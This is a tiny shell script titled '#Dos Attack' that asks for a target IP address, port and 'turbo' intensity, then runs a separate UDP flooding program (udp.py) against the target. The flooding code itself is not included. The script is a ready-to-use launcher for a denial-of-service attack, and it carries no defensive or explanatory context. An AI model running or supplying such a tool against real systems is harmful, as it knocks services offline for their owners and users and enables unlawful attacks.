#Dos Attack
read -p "IP TARGET : " ip
read -p "PORT (DEFAULT :80) : " port
read -p "TURBO (DEFAULT : 500) : " turbo
python3 udp.py -s$ip -p$port -t$turbo
